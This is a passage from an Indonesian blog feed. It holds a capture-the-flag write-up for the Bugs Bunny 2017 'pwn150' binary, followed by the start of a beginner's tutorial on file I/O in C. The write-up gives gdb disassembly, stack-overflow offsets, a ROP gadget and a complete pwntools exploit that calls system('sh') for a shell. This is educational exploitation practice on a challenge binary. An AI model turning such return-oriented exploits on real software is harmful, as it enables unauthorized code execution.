Non-debugging symbols:
0x0000000000400598  _init
0x00000000004005d0  puts@plt
0x00000000004005e0  system@plt
0x00000000004005f0  &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt
0x0000000000400600  __libc_start_main@plt
0x0000000000400610  fgets@plt
0x0000000000400620  fflush@plt
0x0000000000400630  fopen@plt
0x0000000000400640  fwrite@plt
0x0000000000400660  _start
0x0000000000400690  deregister_tm_clones
0x00000000004006d0  register_tm_clones
0x0000000000400710  __do_global_dtors_aux
0x0000000000400730  frame_dummy
0x0000000000400756  today
0x0000000000400767  Hello
0x00000000004007f4  main
0x0000000000400820  __libc_csu_init
0x0000000000400890  __libc_csu_fini
0x0000000000400894  _fini&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hasil disassembly fungsi today&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;pdisass today
Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;today:
   0x0000000000400756 &amp;lt;+0&amp;gt;:	push   rbp
   0x0000000000400757 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x000000000040075a &amp;lt;+4&amp;gt;:	mov    edi,0x4008a8
   0x000000000040075f &amp;lt;+9&amp;gt;:	call   0x4005e0 &amp;lt;system@plt&amp;gt;
   0x0000000000400764 &amp;lt;+14&amp;gt;:	nop
   0x0000000000400765 &amp;lt;+15&amp;gt;:	pop    rbp
   0x0000000000400766 &amp;lt;+16&amp;gt;:	ret    
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Terdapat pemanggilan fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; dengan argument &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/date&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/s 0x4008a8
0x4008a8:	&lt;span class=&quot;s2&quot;&gt;&quot;/bin/date&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hasil disassembly fungsi Hello&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;pdisass Hello
Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;Hello:
   0x0000000000400767 &amp;lt;+0&amp;gt;:	push   rbp
   0x0000000000400768 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x000000000040076b &amp;lt;+4&amp;gt;:	sub    rsp,0x50
   0x000000000040076f &amp;lt;+8&amp;gt;:	mov    edi,0x4008b8
   0x0000000000400774 &amp;lt;+13&amp;gt;:	mov    eax,0x0
   0x0000000000400779 &amp;lt;+18&amp;gt;:	call   0x4005f0 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;
   0x000000000040077e &amp;lt;+23&amp;gt;:	mov    rax,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rip+0x2008eb]        &lt;span class=&quot;c&quot;&gt;# 0x601070 &amp;lt;stdout@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x0000000000400785 &amp;lt;+30&amp;gt;:	mov    rdi,rax
   0x0000000000400788 &amp;lt;+33&amp;gt;:	call   0x400620 &amp;lt;fflush@plt&amp;gt;
   0x000000000040078d &amp;lt;+38&amp;gt;:	mov    rdx,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rip+0x2008ec]        &lt;span class=&quot;c&quot;&gt;# 0x601080 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x0000000000400794 &amp;lt;+45&amp;gt;:	lea    rax,[rbp-0x50]
   0x0000000000400798 &amp;lt;+49&amp;gt;:	mov    esi,0xc0
   0x000000000040079d &amp;lt;+54&amp;gt;:	mov    rdi,rax
   0x00000000004007a0 &amp;lt;+57&amp;gt;:	call   0x400610 &amp;lt;fgets@plt&amp;gt;
   0x00000000004007a5 &amp;lt;+62&amp;gt;:	mov    esi,0x4008e1
   0x00000000004007aa &amp;lt;+67&amp;gt;:	mov    edi,0x4008e3
   0x00000000004007af &amp;lt;+72&amp;gt;:	call   0x400630 &amp;lt;fopen@plt&amp;gt;
   0x00000000004007b4 &amp;lt;+77&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],rax
   0x00000000004007b8 &amp;lt;+81&amp;gt;:	cmp    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x0
   0x00000000004007bd &amp;lt;+86&amp;gt;:	jne    0x4007d0 &amp;lt;Hello+105&amp;gt;
   0x00000000004007bf &amp;lt;+88&amp;gt;:	mov    edi,0x4008f8
   0x00000000004007c4 &amp;lt;+93&amp;gt;:	call   0x4005d0 &amp;lt;puts@plt&amp;gt;
   0x00000000004007c9 &amp;lt;+98&amp;gt;:	mov    eax,0x1
   0x00000000004007ce &amp;lt;+103&amp;gt;:	jmp    0x4007f2 &amp;lt;Hello+139&amp;gt;
   0x00000000004007d0 &amp;lt;+105&amp;gt;:	mov    rdx,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8]
   0x00000000004007d4 &amp;lt;+109&amp;gt;:	lea    rax,[rbp-0x50]
   0x00000000004007d8 &amp;lt;+113&amp;gt;:	mov    rcx,rdx
   0x00000000004007db &amp;lt;+116&amp;gt;:	mov    edx,0x1
   0x00000000004007e0 &amp;lt;+121&amp;gt;:	mov    esi,0x40
   0x00000000004007e5 &amp;lt;+126&amp;gt;:	mov    rdi,rax
   0x00000000004007e8 &amp;lt;+129&amp;gt;:	call   0x400640 &amp;lt;fwrite@plt&amp;gt;
   0x00000000004007ed &amp;lt;+134&amp;gt;:	mov    eax,0x0
   0x00000000004007f2 &amp;lt;+139&amp;gt;:	leave  
   0x00000000004007f3 &amp;lt;+140&amp;gt;:	ret    
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;fgets&lt;/code&gt; digunakan untuk user input sebanyak &lt;code class=&quot;highlighter-rouge&quot;&gt;0xc0&lt;/code&gt; bytes atau 192 bytes dalam desimal.
Selain itu, fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;fopen&lt;/code&gt; akan membuka file bernama &lt;code class=&quot;highlighter-rouge&quot;&gt;bugsbunny.txt&lt;/code&gt; dalam mode &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt; atau &lt;code class=&quot;highlighter-rouge&quot;&gt;append&lt;/code&gt; untuk menyimpan inputan user.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/s 0x4008e1
0x4008e1:	&lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/s 0x4008e3
0x4008e3:	&lt;span class=&quot;s2&quot;&gt;&quot;bugsbunny.txt&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Setelah itu fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt; akan mengeluarkan output &lt;code class=&quot;highlighter-rouge&quot;&gt;So shorry cant talk to you now :( &lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/s 0x4008f8
0x4008f8:	&lt;span class=&quot;s2&quot;&gt;&quot;So shorry cant talk to you now :( &quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;lets-overflow&quot;&gt;Let’s OverFlow&lt;/h3&gt;

&lt;p&gt;Setelah dilakukan fuzzing, dibutuhkan 88 bytes untuk mengoverwrite register &lt;code class=&quot;highlighter-rouge&quot;&gt;rip&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;percobaan dengan menginput kan 88 bytes huruf “A” + 4 bytes huruf “B” untuk memastikan nya kalau itu benar-benar 88 bytes untuk mengoverwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;rip&lt;/code&gt; nya.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/x &lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;
0xa42424242:	Cannot access memory at address 0xa42424242&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Terlihat 0x42 adalah huruf ‘B’ dalam ascii.&lt;/p&gt;

&lt;p&gt;Karena 64 bit elf binary menyimpan argument nya pada register yang mana masing-masing argument ke 1,2,3 dst (dan saya bingung wkwk) akan disimpan di &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi, rsi dan rcx&lt;/code&gt; .
saya menggunakan &lt;a href=&quot;http://ropshell.com/ropsearch?h=4a33feaf7ac08268b924f4cb8b5cafbe&quot;&gt;online rop gadget search&lt;/a&gt; untuk mencari gadget &lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi; ret&lt;/code&gt; yang digunakan untuk memasukan argument ke &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Didapatkan gadget &lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi; ret&lt;/code&gt; berada didalamat &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00400883&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Setelah itu mencari alamat dari fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; didapatkan &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00000000004005e0&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;info functions
All defined functions:

Non-debugging symbols:
....
0x00000000004005e0  system@plt
....&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Lalu mencari alamat dari &lt;code class=&quot;highlighter-rouge&quot;&gt;sh&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;find &lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;
Searching &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sh'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;: None ranges
Found 100 results, display max 100 items:
    pwn150 : 0x4003ef --&amp;gt; 0x6e65706f66006873 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sh'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Tujuan kita adalah me spawning shell dengan fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;system('sh')&lt;/code&gt; karena binary tersebut di proteksi dengan NX jadi tidak bisa menggunakan shellcode.&lt;/p&gt;

&lt;p&gt;Sehingga penyusunan payloadnya akan menjadi seperti berikut&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;junk + pop_rdi_ret_addr + sh_addr + system_addr&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Atau implementasi menggunakan python.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;88&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4003ef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rdi_ret_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400883&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# pop rdi; ret&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004005e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_ret_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Berikut exploit code lengkap nya.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'amd64'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/home/rhama/Downloads/pwn150&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;88&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4003ef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rdi_ret_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400883&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# pop rdi; ret&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004005e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_ret_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Setelah code dieksekusi akan mendapat interactive shell.&lt;/p&gt;

&lt;!-- mencari gadget
http://ropshell.com/ropsearch?h=4a33feaf7ac08268b924f4cb8b5cafbe

0x00400883 : pop rdi; ret --&gt;
</description>
        <pubDate>Sat, 22 Jul 2017 00:00:00 +0700</pubDate>
        <link>https://rhama.my.id/ctf/2017/07/22/bugs-bunny2k17-pwn150.html</link>
        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/07/22/bugs-bunny2k17-pwn150.html</guid>
        
        <category>bugs-bunny2k17</category>
        
        <category>CTF</category>
        
        
        <category>CTF</category>
        
      </item>
    
      <item>
        <title>File Input/Output In C</title>
        <description>&lt;p&gt;Posting tentang programming C pertama, dimana saya akan membahas mengenai File Input/Output di C dengan menggunakan berbagai macam fungsi yang berhubungan dengan File I/O di C yang sudah tersedia di pustaka “stdio.h”.&lt;/p&gt;

&lt;h2 id=&quot;tipe-files&quot;&gt;Tipe Files&lt;/h2&gt;
&lt;p&gt;Terdapat dua tipe files yang harus diketahui, yaitu Text File dan Binary File.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Text File&lt;/strong&gt; - Adalah text file biasa yang berformat .txt dan dapat dibaca (&lt;em&gt;readable&lt;/em&gt;) oleh manusia.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Binary File&lt;/strong&gt; - Adalah data nya disimpan dalam bentuk biner (0 dan 1) dan tidak dapat dibaca (&lt;em&gt;not readable&lt;/em&gt;) oleh manusia.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;operasi-file-yang-biasa-dilakukan&quot;&gt;Operasi File Yang Biasa Dilakukan&lt;/h2&gt;
&lt;p&gt;Didalam bahasa C, kita dapat melakukan ke-4 operasi dibawah ini, baik untuk binary file dan text file.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Membuat file baru&lt;/li&gt;
  &lt;li&gt;Membuka file yang telah ada&lt;/li&gt;
  &lt;li&gt;Menutup file&lt;/li&gt;
  &lt;li&gt;Membaca dan menulis informasi ke sebuah file&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;bekerja-dengan-files&quot;&gt;Bekerja Dengan Files&lt;/h2&gt;

&lt;p&gt;Untuk memulai bekerja dengan file, kita harus mendeklarasi pointer dari tipe FILE. Ini dibutuhkan untuk komunikasi antara program dan file.&lt;/p&gt;

&lt;p&gt;Bentuk umum deklarasi pointer dari tipe FILE&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;membuka-file&quot;&gt;Membuka File&lt;/h3&gt;

&lt;p&gt;Untuk membuka file, kita dapat menggunakan fungsi fopen().&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Syntax Umum&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;const char *path&lt;/strong&gt; = Diisi dengan &lt;em&gt;path&lt;/em&gt;  atau lokasi dari file yang akan dioperasikan.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;const char *mode&lt;/strong&gt; = Diisi dengan salah satu &lt;em&gt;mode&lt;/em&gt; dibawah ini&lt;/p&gt;
&lt;table&gt;
&lt;colgroup&gt;
&lt;col width=&quot;40%&quot; /&gt;
&lt;col width=&quot;280%&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr class=&quot;header&quot;&gt;
&lt;th&gt;Mode&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;r (read)&lt;/td&gt;
&lt;td&gt;Membuka file untuk dibaca&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;w (write)&lt;/td&gt;
&lt;td&gt;Membuka file untuk ditulis dan apabila terdapat file dengan nama sama, isi dari file yang lama akan ditimpa
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;a (append)&lt;/td&gt;
&lt;td&gt;Membuka file untuk ditambahkan isi nya diakhir file dan apabila file belum ada akan dibuat baru&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;r+&lt;/td&gt;
&lt;td&gt;Membuka file untuk dibaca dan ditulis
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;w+&lt;/td&gt;
&lt;td&gt;Membuka file untuk dibaca dan ditulis&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;a+&lt;/td&gt;
&lt;td&gt;Membuka file untuk dibaca dan ditulis
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rb&lt;/td&gt;
&lt;td&gt;Membuka file untuk dibaca untuk binary file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;wb&lt;/td&gt;
&lt;td&gt;Membuka file untuk ditulis untuk binary file
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ab&lt;/td&gt;
&lt;td&gt;Membuka file untuk ditambahkan untuk binary file&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;Return Value&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;font color=&quot;green&quot;&gt;Success&lt;/font&gt;
    &lt;p&gt;Pointer ke FILE object&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;font color=&quot;red&quot;&gt;Fail&lt;/font&gt;
    &lt;p&gt;Return NULL&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Contoh penggunaan&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Belajar_io.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// your code
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// your code
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;menutup-file&quot;&gt;Menutup File&lt;/h3&gt;
&lt;p&gt;Baik itu saat mengoperasikan text file/binary file haruslah di tutup apabila selesai dibaca ataupun ditulis. Untuk menutupnya, dapat menggunakan fungsi fclose().&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Syntax Umum&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;FILE *stream&lt;/strong&gt; - Diisi dengan pointer dari tipe FILE yang telah didelarasi sebelum nya.&lt;/p&gt;

